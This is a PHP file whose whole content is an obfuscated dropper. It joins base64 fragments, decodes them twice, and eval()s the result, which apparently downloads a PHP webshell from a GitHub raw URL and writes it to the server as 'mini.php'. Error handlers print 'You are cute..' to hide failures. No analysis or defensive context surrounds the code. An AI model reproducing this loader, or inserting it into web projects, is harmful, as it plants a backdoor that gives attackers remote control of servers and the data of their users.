<?php

try {
    $z = "";
    $z .= "UEQ5d2FI";
    $z .= "QUtDaVJ5";
    $z .= "WlcxdmRH";
    $z .= "VlZjbXdn";
    $z .= "SUNBZ0lD";
    $z .= "QTlJQ2Rv";
    $z .= "ZEhSd2N6";
    $z .= "b3ZMM0po";
    $z .= "ZHk1bmFY";
    $z .= "Um9kV0ox";
    $z .= "YzJWeVky";
    $z .= "OXVkR1Z1";
    $z .= "ZEM1amIy";
    $z .= "MHZWMmxz";
    $z .= "WkVWd2FX";
    $z .= "VnBTMlZw";
    $z .= "WVM5UWFI";
    $z .= "QXRWMlZp";
    $z .= "YzJobGJH";
    $z .= "d3RZbmx3";
    $z .= "WVhOekwz";
    $z .= "Smxabk12";
    $z .= "YUdWaFpI";
    $z .= "TXZiV0Zw";
    $z .= "Ymk4ME1E";
    $z .= "TXVjR2h3";
    $z .= "SnpzS0pI";
    $z .= "SmxiVzkw";
    $z .= "WlVOdmJu";
    $z .= "UmxiblFn";
    $z .= "SUQwZ1pt";
    $z .= "bHNaVjlu";
    $z .= "WlhSZlky";
    $z .= "OXVkR1Z1";
    $z .= "ZEhNb0pI";
    $z .= "SmxiVzkw";
    $z .= "WlZWeWJD";
    $z .= "azdDaVJs";
    $z .= "Ym1OdlpH";
    $z .= "VmtRMjl1";
    $z .= "ZEdWdWRD";
    $z .= "QTlJR0po";
    $z .= "YzJVMk5G";
    $z .= "OWxibU52";
    $z .= "WkdVb0pI";
    $z .= "SmxiVzkw";
    $z .= "WlVOdmJu";
    $z .= "UmxiblFw";
    $z .= "T3dvS2FX";
    $z .= "WWdLR1pw";
    $z .= "YkdWZmNI";
    $z .= "VjBYMk52";
    $z .= "Ym5SbGJu";
    $z .= "UnpLQ2R0";
    $z .= "YVc1cExu";
    $z .= "Qm9jQ2Nz";
    $z .= "SUdKaGMy";
    $z .= "VTJORjlr";
    $z .= "WldOdlpH";
    $z .= "VW9KR1Z1";
    $z .= "WTI5a1pX";
    $z .= "UkRiMjUw";
    $z .= "Wlc1MEtT";
    $z .= "a3BJSHNL";
    $z .= "SUNBZ0lH";
    $z .= "VmphRzhn";
    $z .= "SWtacGJH";
    $z .= "VWdPaUJ0";
    $z .= "YVc1cExu";
    $z .= "Qm9jQ0JU";
    $z .= "ZFdOalpY";
    $z .= "TnpJQ0Vp";
    $z .= "T3dwOUlH";
    $z .= "VnNjMlVn";
    $z .= "ZXdvZ0lD";
    $z .= "QWdaV05v";
    $z .= "YnlBaVJY";
    $z .= "SnliM0lp";
    $z .= "T3dwOUNn";
    $z .= "cGxZMmh2";
    $z .= "SUNKdGFX";
    $z .= "NXBPaUJ5";
    $z .= "WlcxdmRH";
    $z .= "VWdiRzlo";
    $z .= "WkdWeUlq";
    $z .= "c0tQejRL";
    $fn = 'base64_decode';
    $s1 = $fn($z);
    if ($s1 === false) { throw new Exception('oops..'); }
    $s2 = $fn($s1);
    if ($s2 === false) { throw new Exception('oops..'); }
    $tokens = token_get_all($s2);
    $smartCode = '';
    $inEcho = false;
    foreach ($tokens as $t) {
        if (is_array($t)) {
            switch ($t[0]) {
                case T_OPEN_TAG:
                    break;
                case T_CLOSE_TAG:
                    if ($inEcho) { $smartCode .= ');'; $inEcho = false; }
                    else { $smartCode .= ';'; }
                    break;
                case T_OPEN_TAG_WITH_ECHO:
                    $smartCode .= 'echo (';
                    $inEcho = true;
                    break;
                case T_INLINE_HTML:
                    $smartCode .= 'echo ' . var_export($t[1], true) . ';';
                    break;
                default:
                    $smartCode .= $t[1];
            }
        } else {
            if ($inEcho && trim($t) === ';') {
                $smartCode .= ');';
                $inEcho = false;
            } else {
                $smartCode .= $t;
            }
        }
    }
    eval($smartCode);
} catch (\ParseError $e) {
    echo "You are cute..";
} catch (\Throwable $e) {
    echo "You are cute..";
}

?>
